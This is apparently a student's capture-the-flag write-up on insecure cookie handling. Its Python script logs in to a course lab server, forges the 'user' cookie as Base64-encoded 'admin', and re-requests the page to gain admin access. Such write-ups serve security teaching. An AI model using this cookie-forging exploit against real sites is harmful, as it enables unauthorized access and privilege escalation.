# Challenge "Secure by Design" Writeup

## Vulnerability: Insecure Cookie Handling

### Where: Setting and manipulating cookies, and handling user input

### Impact: The code may be susceptible to unauthorized access or privilege escalation due to insecure cookie handling. Additionally, there might be potential vulnerabilities related to session integrity.

**NOTE**: The provided code interacts with a web server, sets user cookies, and attempts to manipulate a cookie value to gain unauthorized access. It uses the `requests` library for HTTP requests and `base64` for encoding.

## Steps to reproduce:

1. The code establishes a session using the `requests.Session()` object to persist cookies between requests.

2. Accesses the first link to set the user cookie and prints the response.

3. Creates a data dictionary containing the 'username' field.

4. Makes a POST request to the server with the provided data.

5. Encodes the string "admin" to Base64 and updates the 'user' cookie in the session with the encoded value.

6. Prints the updated cookies in the session.

7. Prints the response from the POST request.

8. Makes a GET request to the server and prints the response.

**Observations:**

- The code attempts to manipulate the 'user' cookie to have the value "admin" by encoding it to Base64.

- The session handling does not consider secure practices, and there may be potential security risks associated with unauthorized cookie manipulation.

## Code:

```python
import requests
import base64

link = "http://mustard.stt.rnl.tecnico.ulisboa.pt:23056"

# Create a session to persist the cookies between requests
s = requests.Session()

# Access the first link to set the user cookie
response1 = s.get(link)
print(response1.text)

data = {
    'username': 'mmabreu'
}

# Make the POST request
response2 = s.post(link, data=data)

# Encode "admin" to Base64
new_value = "admin"
new_cookie_value = base64.b64encode(new_value.encode('utf-8')).decode('utf-8')

# Set the updated cookie in the session with the correct domain
s.cookies.set('user', new_cookie_value, domain='mustard.stt.rnl.tecnico.ulisboa.pt')

# Print the updated cookies
print("Updated Cookies:", s.cookies)

print(response2.text)
print(s.cookies)

response3 = s.get(link)
print(response3.text)
